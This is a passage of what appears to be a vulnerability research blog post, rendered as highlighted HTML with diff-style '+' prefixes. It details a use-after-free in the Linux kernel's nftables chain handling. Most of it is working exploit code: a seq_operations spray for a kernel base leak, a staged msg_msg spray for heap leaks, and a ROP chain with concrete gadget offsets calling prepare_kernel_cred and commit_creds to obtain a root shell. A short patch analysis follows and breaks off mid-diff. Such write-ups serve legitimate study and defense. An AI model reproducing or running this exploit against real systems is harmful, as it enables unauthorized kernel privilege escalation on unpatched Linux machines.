+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">nft_verdict_uninit</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nft_data <span style="color:#f92672">*</span>data)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nft_chain <span style="color:#f92672">*</span>chain;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nft_rule <span style="color:#f92672">*</span>rule;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (data<span style="color:#f92672">-&gt;</span>verdict.code) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_JUMP:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_GOTO:
+</span></span><span style="display:flex;"><span>		chain <span style="color:#f92672">=</span> data<span style="color:#f92672">-&gt;</span>verdict.chain;
+</span></span><span style="display:flex;"><span>		chain<span style="color:#f92672">-&gt;</span>use<span style="color:#f92672">--</span>;
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Essentially, chain-&gt;use of the target chain must be decremented to 0 before the transaction worker <code>nf_tables_trans_destroy_work</code> runs, and the transaction worker must run before the failed batch transaction is aborted.</p>
+<p>If the rule is marked for deletion before <code>nf_tables_chain_destroy</code> is called, chain-&gt;use of the target chain will be 0 when the chain is destroyed, allowing the chain to be freed. As seen in the function code previously, the chain is freed in the order <code>chain-&gt;name</code>, <code>chain-&gt;udata</code>, and <code>chain</code>. The <code>struct nft_chain</code> object has been freed, but we still have a reference to the freed chain via the rule (which is not actually deleted because the second transaction fails), resulting in a use-after-free. The space where chain, chain-&gt;name and chain-&gt;udata originally was can now be reclaimed with another object to aid us in our exploitation.</p>
+<h4 id="obtaining-a-kernel-text-leak">Obtaining a kernel text leak</h4>
+<p>Before going into how to obtain a leak, it is important to understand how and where the chain, chain-&gt;udata and chain-&gt;name objects are allocated.</p>
+<p>The <code>struct nft_chain</code> object is allocated when nftables receives a <code>NFT_MSG_NEWCHAIN</code> message. In the control plane, <code>nf_tables_newchain</code> calls <code>nf_tables_addchain</code>, which allocates the new chain object in the <code>kmalloc-cg-128</code> cache. chain-&gt;udata and chain-&gt;name are allocated in their respective <code>kmalloc-cg</code> caches by <code>nla_memdup</code> and <code>nla_strdup</code> respectively.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nf_tables_addchain</span>(<span style="color:#66d9ef">struct</span> nft_ctx <span style="color:#f92672">*</span>ctx, u8 family, u8 genmask,
+</span></span><span style="display:flex;"><span>			      u8 policy, u32 flags,
+</span></span><span style="display:flex;"><span>			      <span style="color:#66d9ef">struct</span> netlink_ext_ack <span style="color:#f92672">*</span>extack)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>		chain <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>chain), GFP_KERNEL_ACCOUNT);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (chain <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nla[NFTA_CHAIN_NAME]) {
+</span></span><span style="display:flex;"><span>		chain<span style="color:#f92672">-&gt;</span>name <span style="color:#f92672">=</span> <span style="color:#a6e22e">nla_strdup</span>(nla[NFTA_CHAIN_NAME], GFP_KERNEL_ACCOUNT);
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(flags <span style="color:#f92672">&amp;</span> NFT_CHAIN_BINDING)) {
+</span></span><span style="display:flex;"><span>			err <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err_destroy_chain;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">snprintf</span>(name, <span style="color:#66d9ef">sizeof</span>(name), <span style="color:#e6db74">&#34;__chain%llu&#34;</span>, <span style="color:#f92672">++</span>chain_id);
+</span></span><span style="display:flex;"><span>		chain<span style="color:#f92672">-&gt;</span>name <span style="color:#f92672">=</span> <span style="color:#a6e22e">kstrdup</span>(name, GFP_KERNEL_ACCOUNT);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (nla[NFTA_CHAIN_USERDATA]) {
+</span></span><span style="display:flex;"><span>		chain<span style="color:#f92672">-&gt;</span>udata <span style="color:#f92672">=</span> <span style="color:#a6e22e">nla_memdup</span>(nla[NFTA_CHAIN_USERDATA], GFP_KERNEL_ACCOUNT);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (chain<span style="color:#f92672">-&gt;</span>udata <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>			err <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> err_destroy_chain;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		chain<span style="color:#f92672">-&gt;</span>udlen <span style="color:#f92672">=</span> <span style="color:#a6e22e">nla_len</span>(nla[NFTA_CHAIN_USERDATA]);
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>It is possible to leak data via reading from chain-&gt;name. However, as chain-&gt;name is treated as a string, it is only possible to print data up to a null byte.</p>
+<p>To obtain a kernel text leak, <code>struct seq_operations</code> was chosen as the spray object. In kernel version 6.2.0, <code>struct seq_operations</code> is allocated in the <code>kmalloc-cg-32</code> cache by the function <code>single_open</code> in fs/seq_file.c. This object is perfect for leaking as it contains a pointer to a kernel text pointer (the <code>single_start</code> function).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> seq_operations {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">*</span>start) (<span style="color:#66d9ef">struct</span> seq_file <span style="color:#f92672">*</span>m, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>pos);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>stop) (<span style="color:#66d9ef">struct</span> seq_file <span style="color:#f92672">*</span>m, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span> (<span style="color:#f92672">*</span>next) (<span style="color:#66d9ef">struct</span> seq_file <span style="color:#f92672">*</span>m, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>pos);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>show) (<span style="color:#66d9ef">struct</span> seq_file <span style="color:#f92672">*</span>m, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v);
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p><code>struct seq_operations</code> was sprayed to reclaim the freed space originally occupied by chain-&gt;name [8]. chain-&gt;name was then read to obtain a text leak, which can be used to calculate the kernel base [9].</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Spray seq_operations to fill up kmalloc-cg-32 (chain-&gt;name)   
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spray seq_operations to fill up kmalloc-cg-32 chain-&gt;name</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_SEQOPS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        seqops[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/proc/self/stat&#34;</span>, O_RDONLY);               <span style="color:#f92672">&lt;--</span> [<span style="color:#ae81ff">8</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (seqops[i] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] open&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Get kernel text address leak of single_start and calculate kbase
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> kbase_leak[<span style="color:#ae81ff">0x10</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> k_single_start <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// 0x4b2470 offset
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint64_t</span> kbase <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> err <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Getting leak</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Leak
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>rleak <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_rule_alloc</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_u32</span>(rleak, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_str</span>(rleak, NFTNL_RULE_TABLE, table_name);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_set_str</span>(rleak, NFTNL_RULE_CHAIN, <span style="color:#e6db74">&#34;chain2&#34;</span>);
+</span></span><span style="display:flex;"><span>    rseq <span style="color:#f92672">=</span> seq;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    nlh <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_nlmsg_build_hdr</span>(buf, NFT_MSG_GETRULE, NFPROTO_IPV4, NLM_F_DUMP, seq<span style="color:#f92672">++</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_nlmsg_build_payload</span>(nlh, rleak);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mnl_socket_sendto</span>(nl, buf, nlh<span style="color:#f92672">-&gt;</span>nlmsg_len);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (rseq <span style="color:#f92672">&lt;</span> seq) {
+</span></span><span style="display:flex;"><span>        err <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_socket_recvfrom</span>(nl, buf, <span style="color:#66d9ef">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>        err <span style="color:#f92672">=</span> <span style="color:#a6e22e">mnl_cb_run</span>(buf, err, rseq, <span style="color:#a6e22e">mnl_socket_get_portid</span>(nl), leak_cb, leak_expr_cb);
+</span></span><span style="display:flex;"><span>        rseq <span style="color:#f92672">+=</span> err <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">nftnl_rule_free</span>(rleak);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    kbase <span style="color:#f92672">=</span> number <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4b2470</span>;                                       <span style="color:#f92672">&lt;--</span> [<span style="color:#ae81ff">9</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Kernel base: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kbase);
+</span></span></code></pre></div><h4 id="obtaining-a-heap-leak">Obtaining a heap leak</h4>
+<p>Ideally, to have enough space for our fake <code>struct nft_rule</code>, <code>struct nft_expr</code> and <code>struct nft_expr_ops</code>, we would like to have a kmalloc-cg-1024 heap leak (where we can allocate the <code>struct msg_msg</code> which contains all our fake objects). However, kmalloc-cg-1024 addresses will always end with a null byte, hence preventing us from directly printing the address via chain-&gt;name.</p>
+<p>In order to circumvent this limitation, we will spray <code>struct msg_msg</code> in the following way as shown below (prev pointers are omitted for simplicity):</p>
+<p><img src="/diagram1.png" alt="Leak kmalloc-cg-96 pointer"></p>
+<p>In a single message queue, there will be:</p>
+<ol>
+<li>Primary message (size 64) &ndash; this will reclaim the free space where chain-&gt;name originally was</li>
+<li>Secondary message (size 96)</li>
+<li>Third message (size 1024)</li>
+</ol>
+<p>We will first attempt to leak a <code>kmalloc-cg-96</code> pointer via the UAF read from the freed chain. chain-&gt;name would point to the next pointer of the primary message, which would be the address of the secondary message. A size of 96 bytes was chosen as since <code>kmalloc-cg-96</code> cache objects are small, there is a much lower probability that the last byte of the address would be 0x0 and cause our leak to truncate and fail.</p>
+<p>After obtaining a valid <code>kmalloc-cg-96</code> heap pointer, we now want to leak the <code>kmalloc-cg-1024</code> heap pointer. The next pointer of the secondary message points to the third message, which is allocated in <code>kmalloc-cg-1024</code>. We also know that the <code>struct nft_chain</code> object (which is now freed) was allocated in <code>kmalloc-cg-128</code>. To obtain the leak, we spray a fourth message of size 128 into the space of the freed chain object, and set the fake chain-&gt;name to the address of the <code>kmalloc-cg-96</code> pointer + 1 to bypass the null byte. This is shown in the diagram below:</p>
+<p><img src="/diagram2.png" alt="Leak kmalloc-cg-1024 pointer"></p>
+<p>We can now read from chain-&gt;name to obtain a <code>kmalloc-cg-1024</code> pointer.</p>
+<h4 id="controlling-rip">Controlling RIP</h4>
+<p>When a new rule is added to a base chain, the following functions are called to ensure that the ruleset will not result in any loops:</p>
+<pre tabindex="0"><code>nf_tables_newrule
+    -&gt; nft_table_validate
+        -&gt; nft_chain_validate 
+            -&gt; expr-&gt;ops-&gt;validate
+</code></pre><p>When <code>nft_chain_validate</code> is called, the expressions from the rules in the chain will be validated. nftables will use <code>struct list_head rules</code> in the <code>nft_chain</code> structure to determine what rules belong to the chain. However, we are able to control the space previously occupied by the freed target chain. This means that if we create a fake rule, with a fake expression and fake expression ops pointing to our ROP chain, and then spray a fake chain to reclaim the space of the freed target chain, and finally add a new rule to a base chain, we are able to kick off this chain of functions that will allow us to control RIP.</p>
+<p>We first free the third message (size 1024) and the fourth message (size 128) which was used to leak the heap pointer. We then construct a fake rule, fake expression, fake expression ops and ROP chain in the data section of a <code>struct msg_msg</code> and spray that as our third message. The fake structures and ROP chain can be seen below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Do all the ROP stuff in kmalloc-cg-1024
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] PHASE 3: ROP</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> fake_rule_addr <span style="color:#f92672">=</span> kheap_1024 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x230</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Fake rule address: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fake_rule_addr);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint64_t</span> fake_expr_addr <span style="color:#f92672">=</span> kheap_1024 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x260</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Fake expr ops: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fake_expr_addr);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Make a fake rule 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg_three, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg_three));
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x43</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x215</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x218</span>] <span style="color:#f92672">=</span> fake_expr_addr;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x278</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xba612a</span>; <span style="color:#75715e">// First rop point
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 0xffffffff81ba612a : push rsi ; jmp qword ptr [rsi - 0x7f]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ROP!!!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x199</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd58be</span>; <span style="color:#75715e">// Second rop point
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 0xffffffff810d58be : pop rsp ; pop r15 ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x220</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd58c0</span>; <span style="color:#75715e">// pop rdi ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x228</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2a1b600</span>; <span style="color:#75715e">// init_task
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x230</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x126bc0</span>; <span style="color:#75715e">// prepare_kernel_cred()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x238</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xcb0f92</span>; <span style="color:#75715e">// pop rsi ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 0xffffffff81cb0f92 : pop rsi ; ret 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x240</span>] <span style="color:#f92672">=</span> kheap_1024 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3a0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">48</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x70</span>; <span style="color:#75715e">// rsi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x248</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd287b6</span>; 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 0xffffffff81d287b6 : push rax ; jmp qword ptr [rsi - 0x70]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Jump point after push rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x3a0</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xd58c0</span>; <span style="color:#75715e">// pop rdi ; ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x250</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1268e0</span>; <span style="color:#75715e">// commit_creds()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x258</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xad163</span>; <span style="color:#75715e">// 4 pop
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x280</span>] <span style="color:#f92672">=</span> kbase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x12011cb</span>; <span style="color:#75715e">// swapgs, iretq
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x288</span>] <span style="color:#f92672">=</span> user_rip;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x290</span>] <span style="color:#f92672">=</span> user_cs;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x298</span>] <span style="color:#f92672">=</span> user_rflags;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x2a0</span>] <span style="color:#f92672">=</span> user_sp;
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtext[<span style="color:#ae81ff">0x2a8</span>] <span style="color:#f92672">=</span> user_ss;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Spray msg_msg of size 1024
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>msg_three, <span style="color:#66d9ef">sizeof</span>(msg_three) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>We then spray a fourth <code>struct msg_msg</code> which will act as our fake chain. Shown below is a summary of the objects involved:</p>
+<p><img src="/diagram3.png" alt="Setup for ROP"></p>
+<p>To kick off the ROP chain, simply add a new rule to the previously created base chain &ldquo;chain2&rdquo;, and enjoy your root shell!</p>
+<p>As before, if you would like a graphical representation of the entire exploit chain, check out these slides:</p>
+<iframe src="https://docs.google.com/presentation/d/e/2PACX-1vSVhUbq-ZbzzuM0HE0DRrwOkU8H7DYVcWDlH7DU9S9SM4HJKpXte80GyKWuyFvPFlrqSksLyehdVGsl/embed?start=false&loop=false&delayms=3000" frameborder="0" width="960" height="569" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe>
+<h4 id="patch-analysis">Patch Analysis</h4>
+<p>To patch the bug, simply check the genmask when looking up a chain by its ID.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span> net/netfilter/nf_tables_api.c | 11 +++++++----
+</span></span><span style="display:flex;"><span> 1 file changed, 7 insertions(+), 4 deletions(-)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_api.c
+</span></span><span style="display:flex;"><span>index 9573a8fcad79..3701493e5401 100644
+</span></span><span style="display:flex;"><span><span style="color:#f92672">--- a/net/netfilter/nf_tables_api.c
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ b/net/netfilter/nf_tables_api.c
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -2694,7 +2694,7 @@ static int nf_tables_updchain(struct nft_ctx *ctx, u8 genmask, u8 policy,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> 
